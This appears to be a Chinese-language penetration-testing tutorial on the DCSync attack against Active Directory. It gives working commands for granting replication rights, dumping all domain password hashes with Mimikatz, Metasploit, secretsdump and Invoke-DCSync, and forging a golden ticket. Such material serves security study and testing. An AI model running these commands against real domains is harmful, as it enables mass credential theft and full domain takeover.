
# Dnsync 攻击技术

<div style="text-align: right;">

date: "2023-07-30"

</div>

## DCSync介绍

> AD域渗透中常用的凭据窃取手段

在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 `GetNCChanges` 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 `Directory Replication Service（DRS）` 服务的 `GetNCChanges` 接口向域控发起数据同步请求。

## DCSync攻击原理

DCSync 的原理非常清晰，**利用域控制器之间的数据同步复制**。

- 发现网络中的目标域控制器;
- 通过 `DRS` 服务的 `GetNCChanges` 接口发起数据同步请求，`Directory Replication Service (DRS) Remote Protocol`

在域内用户所具有的权限其实最根本是看用户的DACL，那么对于DCSync攻击来说，只要域用户拥有以下三条DACL即可向域控发出数据同步请求，从而dump去域内用户hash，这三条DACL分别为：

1. 复制目录更改（DS-Replication-Get-Changes）
2. 全部复制目录更改 (DS-Replication-Get-Changes-All )
3. 在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）

一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

注意：DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。

## DCSync能够做的事情

## 给账户添加DCSync权限

```
# 首先导入 PowerView.ps1 脚本
Import-Module .\PowerView.ps1

# 给指定的目标添加 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=xiaorang,DC=lab" -PrincipalIdentity XIAORANG-EXC01$ -Rights DCSync
```

## 利用DCSync导出域内哈希

### Mimikatz

Mimikatz导出域内所有Hash，在获取权限的域成员主机上执行如下：

```
# 导出域内指定用户的信息(包括哈希值)
lsadump::dcsync /domain:whoamianony.org /user:administrator 
lsadump::dcsync /domain:whoamianony.org /user:administrator /csv
# 导出域内所有用户的信息(包括哈希值)
lsadump::dcsync /domain:whoamianony.org /all
lsadump::dcsync /domain:whoamianony.org /all /csv

# 也可以使用下面
mimikatz.exe "lsadump::dcsync /all /csv"
mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /all /csv"
```

### MSF（Mimikatz）

```
# 导出域内所有用户的信息(包括哈希值)
load kiwi
kiwi_cmd mimikatz.exe "lsadump::dcsync /domain:XIAORANG.LAB /all /csv" exit

# 导出域内指定用户的信息(包括哈希值)
load kiwi
kiwi_cmd mimikatz.exe "lsadump::dcsync /domain:XIAORANG.LAB /user:administrator /csv" exit
```

### Secretsdump.py

项目地址：[Github Impackt框架](https://github.com/SecureAuthCorp/impacket/tree/impacket_0_9_22)
Secretsdump.py 是 Impacket 框架中的一个脚本，该脚本也可以通过 DCSync 技术导出域控制器上用户的哈希。该工具的原理是首先使用提供的用户登录凭据通过 smbexec 或者 wmiexec 远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的哈希，同时通过 Dcsync 或从 NTDS.dit 文件中导出所有域用户的哈希。其最大**的优点是支持从域外的计算机连接至域控制器**。

```
# 获取 administrator 用户的哈希
# python3 secretsdump.py domain/<username for DCSync>:password@<dc-ip> -dc-ip <dc-ip> -just-dc-user <username for DCSync>
python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30 -dc-ip 192.168.93.30 -just-dc-user administrator

# 获取所有域用户哈希, 包括机器用户
python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30
```

### PowerShell

项目地址：[Invoke-ReflectivePEinjection 调用 mimikatz中的DCSync功能](https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1)
该脚本可以通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 DCSync 功能
在获取权限的域成员主机上执行如下命令即可：

```
Import-Module .\Invoke-DCSync.ps1

# 导出域内所有用户的哈希值
Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize

# 导出域内指定用户的哈希值
Invoke-DCSync -DumpForest | ft -wrap -autosize
```

## 利用 DCSync 制作黄金票据

在域渗透中，我们可以通过 DCSync 导出域控制器中 krbtgt 账户的哈希，并利用 krbtgt 账户的哈希制作黄金票据。
krbtgt位域控制器的用户账户，是KDC的服务账户，用来创建票据授予服务(TGS)加密的密钥。

```
load kiwi

# 使用 Mimikatz 的 DCSync 功能导出域控制器中 krbtgt 账户的哈希
kiwi_cmd "lsadump::dcsync /domain:whoamianony.org /user:krbtgt"

# 通过 krbtgt 账户的哈希生成黄金票据
# -s：Object Security ID，后面的-三位数不需要
# -k：NTML哈希
golden_ticket_create -u Administrator -d whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142 -k 6be58bfcc0a164af2408d1d3bd313c2a -t gold.tck

# 执行后生成的票据会咱是存放在你的 Kali 上，然后执行以下命令，清空目标主机上的票据
kerberos_ticket_purge

# 最后使用kerberos_ticket_use注入刚才生成的票据即可
kerberos_ticket_use gold.tck

# 可以访问域控任意资源了
dir \\DC\c$
```